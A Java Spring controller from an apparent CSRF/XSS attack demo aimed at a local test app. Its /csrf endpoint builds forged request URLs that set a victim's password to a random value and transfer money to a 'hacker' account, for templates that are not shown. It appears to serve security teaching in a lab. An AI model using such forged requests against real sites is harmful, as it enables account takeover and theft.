package com.csrf.attackDemo;

import org.apache.commons.lang3.RandomStringUtils;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;


@Controller
public class MyController {

    @RequestMapping(value = "/xss")
    public String indexXSS() {
        return "xss";
    }

    //针对javaweb_land在浏览器登录后进行如下操作
    @RequestMapping(value = "/csrf")
    public String indexCSRF(Model model) {
        //获取6位随机字符串
        String password= RandomStringUtils.randomAlphanumeric(6);
        model.addAttribute("password",password);
        String modifyPasswordUrl="http://localhost:8080/verify?newPassword1="+password
                +"&newPassword2="+password;
        String transferUrl="http://localhost:8080/transfer?username=hacker&money=50";
        model.addAttribute("modifyPasswordUrl",modifyPasswordUrl);
        model.addAttribute("transferUrl",transferUrl);
        return "csrf";
    }

//    @RequestMapping(value = "/test")
//    public void testCSRF(@ModelAttribute(value="url") Url url) {
//        String webUrl=url.getWebUrl();
//        System.out.println("webUrl-1:"+webUrl);
//
//    }
}
